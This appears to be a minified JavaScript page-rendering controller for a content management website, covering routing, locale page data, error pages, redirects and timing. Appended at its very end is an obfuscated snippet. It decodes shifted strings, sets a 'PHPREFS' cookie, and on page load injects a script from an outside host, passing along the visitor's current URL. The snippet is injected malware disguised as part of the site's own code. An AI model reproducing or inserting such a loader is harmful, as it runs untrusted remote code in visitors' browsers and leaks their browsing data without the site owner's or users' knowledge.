t,s,a,r,i,n,o,c=null;for(t=0;t<this.data.structurePages.length;t++)if(this.data.structurePages[t].isDetailPage&&(i=(a=(s=this.data.structurePages[t].pageUrl).lastIndexOf("."))>(r=s.lastIndexOf("/"))?a:s.length,n=a>r?s.substring(r+1,a):s.substr(r+1),s.length>0&&e.length>i&&s.substr(0,i)===e.substr(0,i)&&("/"===e.charAt(i)||0===n.length))){if(3===(o=(o=e.substring(0===n.length?i:i+1)).split("/")).length&&o[0].length>0&&o[1].length>0){c=this.data.structurePages[t].id,this.data.placeholderContent={contentType:o[0],contentId:o[1],contentSlug:o[2]};break}if(1===o.length&&o[0].length>0){c=this.data.structurePages[t].id,this.data.placeholderContent={contentType:"",contentId:"",contentSlug:o[0]};break}}return c},SCS.fetchPageData=function(){var e,t=SCS.cacheKeys.site?SCS.cacheKeys.site+"/":"";SCS.performance.startTimer("GET page.json");var s=this.data.pageId&&"string"==typeof this.data.pageId?parseInt(this.data.pageId):this.data.pageId;if(this.data.navMap&&s&&this.data.navMap[s]){var a=this.data.navMap[s];if("string"==typeof a.linkUrl&&a.linkUrl.trim().length>0)return e=a.linkUrl.trim(),void this.redirectToUrl(e)}this.isMlsSite()&&this.data.locale&&-1===[this.getDefaultLanguage(),"root"].indexOf(this.data.locale)?(e=SCS.sitePrefix+t+"pages/"+this.data.locale+"_"+this.data.pageId+".json",this.callService(e,this.processLocalePageData,this.processLocalePageData)):(e=SCS.sitePrefix+t+"pages/"+this.data.pageId+".json",this.callService(e,this.processPageData,this.processPageData))},SCS.processLocalePageData=function(e,t){try{if(!t||200!=e.status||"string"!=typeof t||t.search(/id=(["'])scsControllerBody\1/g)>=0)throw"Invalid response received while fetching locale page data.";var s=this.parseJson(t);this.data.localePageModel=s&&s.base||s}catch(e){this.logError("Unable to retrieve page data for locale: "+this.data.locale)}var a=SCS.cacheKeys.site?SCS.cacheKeys.site+"/":"",r=SCS.sitePrefix+a+"pages/"+this.data.pageId+".json";this.callService(r,this.processPageData,this.processPageData)},SCS.processPageData=function(e,t){SCS.performance.stopTimer("GET page.json");try{if(!t||200!=e.status||"string"!=typeof t||t.search(/id=(["'])scsControllerBody\1/g)>=0)throw"Invalid response received while fetching page data.";var s=this.parseJson(t);this.data.pageModel=this.getEffectivePageModel(s),this.data.pageLayout=this.data.pageModel.properties.pageLayout,this.data.mobileLayout=this.data.pageModel.properties.mobileLayout}catch(e){var a=this.getErrorPageId();if(this.data.isRenderingErrorPage||null===a)throw e;return this.data.isRenderingErrorPage=!0,this.data.placeholderContent=null,this.data.pageId=a,void this.fetchPageData()}this.data.localePageModel&&(this.data.pageModel=this.layerLocalePageProperties(this.data.pageModel,this.data.localePageModel)),this.getPageLayout(SCS.getDeviceInfo().isMobile&&this.data.mobileLayout||this.data.pageLayout)},SCS.layerLocalePageProperties=function(e,t){var s=e;return t.properties&&s.properties&&Object.keys(t.properties).forEach((function(e){s.properties[e]=t.properties[e]})),s},SCS.showErrorPage=function(e){var t=SCS.cacheKeys.theme?SCS.cacheKeys.theme+"/":"",s=SCS.sitePrefix+t+"_themesdelivery/"+encodeURIComponent(this.data.siteInfo.properties.themeName)+"/responsepages/"+encodeURIComponent(e)+".html";SCS.performance.startTimer("GET layout"),this.data.isRenderingResponsePage=!0,this.callService(s,this.processPageLayout)},SCS.set404Condition=function(){this.isPrerenderEnvironment()&&(this.data.isRendering404Condition=!0,this.addMetaTag("prerender-status-code","404"))},SCS.redirectToUrl=function(e){this.isPrerenderEnvironment()?(this.addMetaTag("prerender-status-code","301"),this.addMetaTag("prerender-header","Location: "+e)):window.location.replace?window.location.replace(e):window.location.href=e},SCS.getRedirectUrl=function(e){var t=e;return window.location.search&&window.location.search.length>0&&(t+=window.location.search),window.location.hash&&window.location.hash.length>0&&(t+=window.location.hash),t},SCS.getEffectivePageModel=function(e){var t=e&&e.base?e.base:{},s={};return s.properties=t.properties||{},s.slots=t.slots||{},s.componentInstances=t.componentInstances||{},s},SCS.getEffectiveSlotReuseModel=function(e){return e&&"object"==typeof e&&!Array.isArray(e)?e:{}},SCS.getErrorPageId=function(){var e=null;return this.data.siteInfo&&this.data.siteInfo.properties&&this.data.navMap&&"number"==typeof this.data.siteInfo.properties.errorPage&&this.data.navMap[this.data.siteInfo.properties.errorPage]&&(e=this.data.siteInfo.properties.errorPage),e},SCS.getDeviceInfo=SCS.getDeviceInfo||function(e){return e=e||navigator.userAgent,{isMobile:/Mobi|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(e)&&!/iPad/i.test(e),isIOS:/iPad|iPhone|iPod/i.test(e)&&!window.MSStream}},SCS.isPrerenderEnvironment=SCS.isPrerenderEnvironment||function(e){return(e=e||navigator.userAgent).toLowerCase().indexOf("prerender")>=0},SCS.performance.startTimer=function(e){var t=SCS.performance.now(),s=SCS.performance.timers[e]||{};s.start=t,SCS.performance.timers[e]=s},SCS.performance.stopTimer=function(e){var t=SCS.performance.now(),s=SCS.performance.timers[e]||{};s.end=t,SCS.performance.timers[e]=s},SCS.performance.now=function(){return window.performance&&window.performance.now?window.performance.now():(new Date).getTime()},SCS.performance.startTimer("TOTAL"),SCS.performance.startTimer("CONTROLLER"),SCS.preInitRendering(),SCS.initRendering();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));